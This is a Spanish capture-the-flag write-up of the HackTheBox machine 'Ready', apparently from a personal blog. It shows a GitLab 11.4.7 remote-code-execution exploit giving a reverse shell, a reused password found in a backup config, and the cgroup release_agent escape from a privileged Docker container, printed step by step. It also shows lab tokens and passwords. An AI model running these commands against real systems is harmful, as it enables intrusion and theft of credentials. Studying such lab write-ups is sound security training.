---
layout      : post
title       : "HackTheBox - Ready"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304banner.png
category    : [ htb ]
tags        : [ docker, gitlab, ssh-keys ]
---
Máquina Linux nivel medio. Empezaremos readys a buscar exploits ante un lindo lobo (**Gitlab**), encontraremos contraseñas volando y tendremos que escapar de la ballena (**Docker**) :O

![304readyHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304readyHTB.png)

### TL;DR (Spanish writeup)

Creada por: [bertolis](https://www.hackthebox.eu/profile/27897).

Este writeup lo hice despues de haber resuelto la máquina, por lo tanto (quizás) iré muy directo :P

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Tiene vulnerabilidades bastante comunes.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalada de privilegios](#escalada-de-privilegios)

...

## Enumeración [#](#enumeracion) {#enumeracion}

Empezamos realizando un escaneo de puertos para saber que servicios está corriendo la máquina:

```bash
–» nmap -p- --open -v 10.10.10.220 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

```bash
–» cat initScan 
# Nmap 7.80 scan initiated Wed Jan  6 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.220
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.220 ()   Status: Up
Host: 10.10.10.220 ()   Ports: 22/open/tcp//ssh///, 5080/open/tcp//onscreen///
# Nmap done at Wed Jan  6 25:25:25 2021 -- 1 IP address (1 host up) scanned in 89.87 seconds
```

Tenemos los siguientes servicios activos:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://es.wikipedia.org/wiki/Secure_Shell)**: Conexión remota segura mediante una Shell |
| 5080   | Un puerto con poca información, veamos si en el siguiente escaneo conseguimos algo más           |

Hagamos nuestro escaneo de scripts y versiones con base en cada puerto, con ello obtenemos información más detallada de cada servicio:

```bash
–» nmap -p 22,5080 -sC -sV 10.10.10.220 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
–» cat portScan
# Nmap 7.80 scan initiated Wed Jan  6 25:25:25 2021 as: nmap -p 22,5080 -sC -sV -oN portScan 10.10.10.220
Nmap scan report for 10.10.10.220
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan  6 25:25:25 2021 -- 1 IP address (1 host up) scanned in 27.78 seconds
```

Tenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :-------|
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4           |
| 5080   | HTTP     | nginx (Ahora si tenemos data :P) |

Pues empecemos a enumerar los servicios (:

...

### Puerto 5080 [⌖](#puerto-5080) {#puerto-5080}

Ingresamos en la web: `10.10.10.220:5080` y obtenemos:

![304page5080](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304page5080.png)

Interesante, tenemos el servicio `GitLab`, que nos sirve para gestionar repositorios, controlar versiones de proyectos y mantener software desarrollado colaborativamente. Podemos crearnos una cuenta e ingresar al sistema, intentémoslo:

* [about.gitlab.com](https://about.gitlab.com/)

Creamos la cuenta y si todo está bien, nos redirige al **dashboard** de proyectos:

![304page5080_dash_projects](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304page5080_dash_projects.png)

Nice, jmmm, pues veamos que podemos encontrar...

Despues de algo de jugueteo, encontramos la versión de `GitLab` en el apartado `/help`:

![304page5080_version_gitlab](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304page5080_version_gitlab.png)

* `GitLab 11.4.7`.

Perfecto, ahora tenemos algo en lo que enfocarnos, pues a buscar si existen exploits para esa versión o que podemos intentar hacer con ella (:

...

## Explotación [#](#explotacion) {#explotacion}

Despues de un rato probando, me encontré este repositorio:

* [https://github.com/dotPY-hax/gitlab_RCE](https://github.com/dotPY-hax/gitlab_RCE).

En el cual recopila algunos CVE's con los cuales se logra ejecución remota en la máquina afectada, explotando así un [SSRF](https://portswigger.net/web-security/ssrf) (que básicamente es manipular un servidor, a tal punto de contar con información con la cual no deberíamos contar :P) que juntándolo con un [CSRF injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection) (que nos permite jugar con los `submit` entre aplicaciones) hacia el protocolo [git://](https://stackoverflow.com/questions/33846856/what-exactly-is-the-git-protocol#answer-33846897) lograr ***Remote Command Execution*** (RCE):

Revisando el código debemos cambiar el puerto al que queramos hacer la reverse Shell. Nos ponemos en escucha primero:

```bash
–» nc -lvp 4433
listening on [any] 4433 ...
```

Ahora ejecutamos:

```bash
–» python3 gitlab_rce.py 
usage: gitlab_rce.py <http://gitlab:port> <local-ip>
```

```bash
–» python3 gitlab_rce.py http://10.10.10.220:5080 10.10.14.159
Gitlab Exploit by dotPY [LOL]
registering kDf551GgUn:VutawCPqGC - 200
Getting version of http://10.10.10.220:5080 - 200
The Version seems to be 11.4.7! Choose wisely
delete user kDf551GgUn - 200
[0] - GitlabRCE1147 - RCE for Version <=11.4.7
[1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more
[2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP
type a number and hit enter to choose exploit: 
```

Damos a la opción `0`, ya que es nuestra versión yyyyyyyyy:

![304bash_revSH_gitlab](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304bash_revSH_gitlab.png)

Tenemos una Shell como el usuario `git` en el sistema. Antes de seguir hagámosle un tratamiento a la Shell (TTY), ya que con la que tenemos estamos limitados, no podemos ver los comandos anteriormente ingresados, no podemos hacer `CTRL + C` y demás cosas que podemos hacer en una sesión completa:

* [Youtube - S4vitar explicando como hacer tratamiento de la TTY](https://www.youtube.com/watch?v=GVjNI-cPG6M&t=1689).

Listosss, ahora a enumerar...

El archivo `user.txt` puede ser visualizado con el usuario `git`, aunque su propietario es `dude` :O

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

En la raíz hay un objeto llamativo (cuál es? e.e) pero pues solo es eso, llamativo, ya que esa "pass" no nos sirve con ningún usuario:

```bash
git@gitlab:/home/dude$ ls /
RELEASE  assets  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  root_pass  run  sbin  srv  sys  tmp  usr  var
git@gitlab:/home/dude$ cat /root_pass 
YG65407Bjqvv9A0a8Tm_7w
```

Despues de un rato enumerando y no revisar lo basico :l encontramos esta carpeta:

```bash
git@gitlab:~$ ls -la /opt/
total 24
drwxr-xr-x 1 root root 4096 Dec  1 16:23 .
drwxr-xr-x 1 root root 4096 Jan 24 23:19 ..
drwxr-xr-x 2 root root 4096 Dec  7 09:25 backup
drwxr-xr-x 1 root root 4096 Dec  1 12:41 gitlab
```

```bash
git@gitlab:~$ ls -la /opt/backup/
total 112
drwxr-xr-x 2 root root  4096 Dec  7 09:25 .
drwxr-xr-x 1 root root  4096 Dec  1 16:23 ..
-rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
-rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
-rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb
git@gitlab:~$
```

Revisando cada archivo tenemos curiosidades:

¬ **docker-compose.yml**:

```bash
git@gitlab:/opt/backup$ cat docker-compose.yml
```

```yml
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16
```

* Tenemos el archivo `root_pass`, que está siendo usado para la ejecución de GitLab.
* El puerto `5080` debe estar haciendo algún tipo de Forwarding sobre el `80`.
* Monturas, donde i.e: `./srv/gitlab/config` esta sobre la ruta `/etc/gitlab`. Y así con las demás.
* Ah y que al tener el archivo [`docker-compose.yml`](https://dockertips.com/utilizando-docker-compose) sabemos que estamos [dentro de un contenedor](https://dockertips.com/utilizando-docker-compose).

¬ **gitlab-secrets.json**:

```bash
git@gitlab:/opt/backup$ cat gitlab-secrets.json
```

```json
{
   "gitlab_workhorse":{
      "secret_token":"/HvvEvI/T33qyvK1U4jmnfH7fGxzySlzuhewkOR9Zk0="
   },
   "gitlab_shell":{
      "secret_token":"bad62f769ebf4f96f0114e406fa4605eb25cffd8b629bcff8419bb9078df53b42a219186a19d889a2dfb4f10eb65e6cdc3d784cf70f07c3c29947fc6f1523c14"
   },
   "gitlab_rails":{
      "secret_key_base":"b7c70c02d37e37b14572f5387919b00206d2916098e3c54147f9c762d6bef2788a82643d0c32ab1cdb315753d6a4e59271cddf9b41f37c814dd7d256b7a2f353",
      "db_key_base":"eaa32eb7018961f9b101a330b8a905b771973ece8667634e289a0383c2ecff650bb4e7b1a6034c066af2f37ea3ee103227655c33bc17c123c99f421ee0776429",
      "otp_key_base":"b30e7b1e7e65c31d70385c47bc5bf48cbe774e39492280df7428ce6f66bc53ec494d2fbcbf9b49ec204b3ba741261b43cdaf7a191932f13df1f5bd6018458e56",
      "openid_connect_signing_key":"\"-----BEGIN RSA PRIVATE KEY-----\nMIIJKAIBAAKCAgEA2l/m01GZYRj9Iv5A49uAULFBomOnHxHnQ5ZvpUPRj1fMovoC\ndQBdEPdcB+KmsHKbtv21Ycfe8fK2RQpTZPq75AjQ37x63S/lpVEnF7kxcAAf0mRw\nBEtKoBs3nodnosLdyD0+gWl5OHO8MSghGLj/IrAuZzYPXQ7mlEgZXVPezJvYyUZ3\\..."
      ...
```

En internet dice que es un archivo para restaurar el sistema en caso tal o.o

¬ **gitlab.rb**:

```bash
git@gitlab:/opt/backup$ cat gitlab.rb
## GitLab configuration settings
##! This file is generated during initial installation and **is not** modified
##! during upgrades.
...
```

Un archivo con muchos comentarios (: si se los quitamos nos encontramos:

```bash
git@gitlab:/opt/backup$ cat gitlab.rb | grep -vE "^#" | uniq -u
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

> Con `-E` le ingresamos la expresion regular, para que tome todo lo que inicie con `#`. Y con `-v` le indicamos que nos borre ese output.

Tenemos una contraseña, intentemos probar con los usuarios:

```bash
git@gitlab:/opt/backup$ su dude
Password: 
su: Authentication failure
```

```bash
git@gitlab:/opt/backup$ su root
Password: 
root@gitlab:/opt/backup# id
uid=0(root) gid=0(root) groups=0(root)
root@gitlab:/opt/backup#
```

Opa, somos usuario administrador del sistema :) Ahora solo nos quedaría ver las flags:

```bash
root@gitlab:~# ls -la
total 24
drwx------ 1 root root 4096 Jan 24 22:37 .
drwxr-xr-x 1 root root 4096 Jan 24 23:19 ..
lrwxrwxrwx 1 root root    9 Dec  7 16:56 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwx------ 2 root root 4096 Dec  7 16:49 .ssh
-rw------- 1 root root 2136 Jan 24 22:37 .viminfo
root@gitlab:~# pwd
/root
root@gitlab:~# 
```

Ehhh? 

Pues no esta y no, no es error de la máquina. Acá estuve un rato atascado (buen rato) enumerando... Me fui para el foro y lo primero que vi fue `"Escape!"`. Relacionando las cosas entendí que al estar en un contenedor, debía buscar una manera de moverme ("escapar") al host.

[Este artículo](https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1) explica muy bien como es el proceso, vamos a repasarlo:

> Are containers that are run with the `--privileged` flag. Unlike regular containers, these containers have root privilege to the host machine. [Vickie Li](https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1)

Pues si, a veces necesario (pero siempre peligroso) para cumplir algunas tareas. Pero bueno, primero debemos saber si estamos sobre un contenedor explotable :P

Para saberlo nos apoyamos del feature en Linux que aísla el uso de recursos (que en nuestro caso Docker lo usa para asilar sus contenedores), llamado `cgroup` (control groups) ubicado en `proc/1/cgroup`:

```bash
root@gitlab:~# cat /proc/1/cgroup
12:freezer:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
11:blkio:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
10:cpuset:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
9:devices:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
8:memory:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
7:cpu,cpuacct:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
6:perf_event:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
5:rdma:/
4:net_cls,net_prio:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
3:hugetlb:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
2:pids:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
1:name=systemd:/docker/7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
0::/system.slice/containerd.service
```

El artículo nos dice que si estamos dentro de un contenedor debemos ver `/docker/ID_del_contenedor`. Así que vamos bien (:

Ahora, ¿cómo sabemos si tiene el atributo `--privileged`?: lo explica, pero no pude probarlo, ya que el comando no está habilitado :P Peeero vamos a creer que si lo tenemos activado (pensamiento lateral e.e)... Escapemos:

* [Understanding Docker Container Escapes - trailofbits.com](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).

Creamos un `cgroup`:

```bash
root@gitlab:~# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

Habilitamos el feature (`release_agent`) que está siendo ejecutado desde el host como `root`:

> release_agent: the path to use for release notifications (this file exists in the top cgroup only) [kernel.org/cgroups](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt)

```bash
root@gitlab:~# echo 1 > /tmp/cgrp/x/notify_on_release
```

Ahora alojamos la ruta del archivo que tendrá nuestros comandos hacia el archivo conteniendo el feature:

```bash
root@gitlab:~# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@gitlab:~# echo $host_path
/var/lib/docker/overlay2/72682da51e1ec80c609bc446d141ff5afed2037d1bdf2810550ecff7fb552e68/diff
root@gitlab:~# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

Terminando, añadimos nuestros comandos al archivo, donde `/cmd` son los comandos y `/output` la respuesta:

```bash
root@gitlab:~# echo '#!/bin/sh' > /cmd
root@gitlab:~# echo "ls -la /root > $host_path/output" >> /cmd
root@gitlab:~# chmod a+x /cmd
```

En mi caso quiero listar el directorio home de `root`.

Finalmente ejecutamos un proceso que termina sobre el `cgroup` que hemos creado y nuestro `release_agent` es lanzado:

```bash
root@gitlab:~# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Veamos el resultado en el archivo `/output`:

```bash
root@gitlab:/# cat cmd 
#!/bin/sh
ls -la /root > /var/lib/docker/overlay2/72682da51e1ec80c609bc446d141ff5afed2037d1bdf2810550ecff7fb552e68/diff/output
```

```bash
root@gitlab:/# cat output 
total 60
drwx------ 10 root root 4096 Dec  7 17:02 .
drwxr-xr-x 20 root root 4096 Dec  7 17:44 ..
lrwxrwxrwx  1 root root    9 Jul 11  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 May  7  2020 .cache
drwx------  3 root root 4096 Jul 11  2020 .config
-rw-r--r--  1 root root   44 Jul  8  2020 .gitconfig
drwxr-xr-x  3 root root 4096 May  7  2020 .local
lrwxrwxrwx  1 root root    9 Dec  7 17:02 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   75 Jul 12  2020 .selected_editor
drwx------  2 root root 4096 Dec  7 16:49 .ssh
drwxr-xr-x  2 root root 4096 Dec  1 12:28 .vim
lrwxrwxrwx  1 root root    9 Dec  7 17:02 .viminfo -> /dev/null
drwxr-xr-x  3 root root 4096 Dec  1 12:41 docker-gitlab
drwxr-xr-x 10 root root 4096 Jul  9  2020 ready-channel
-r--------  1 root root   33 Jul  8  2020 root.txt
drwxr-xr-x  3 root root 4096 May 18  2020 snap
root@gitlab:/# 
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304google_gif_omgBOOM.gif" style="display: block; margin-left: auto; margin-right: auto; width: 40%;"/>

Perfecto, perfectisimo... Pues hagamos lo mismo, pero extraigamos la llave privada SSH (`id_rsa`) del usuario root (bueno, si es que existe), para así entrar sin necesitar contraseña:

```bash
...
...
root@gitlab:~# echo '#!/bin/sh' > /cmd
root@gitlab:~# echo "cat /root/.ssh/id_rsa > $host_path/output" >> /cmd
root@gitlab:~# chmod a+x /cmd
...
...
```

Y el resultado:

![304bash_idRSA_root](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304bash_idRSA_root.png)

Ahora guardémosla en un archivo, le damos los permisos necesarios (`chmod 600 keyroot`) y entremos :O

```bash
–» ssh root@10.10.10.220 -i keyroot
```

![304bash_idRSA_root_shell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304bash_idRSA_root_shell.png)

Ta nice eh!! Bueno, solo nos quedaría ver las flags:

![304flags1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304flags1.png)

![304flags2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/ready/304flags2.png)

...

Final de la máquina neas :P En general me gusto, el tema de **Docker** está superinteresante y loco.

¡Nos charlamos en otro set de ideas y bueno, a seguir rompiendo todo!! ❤️🖤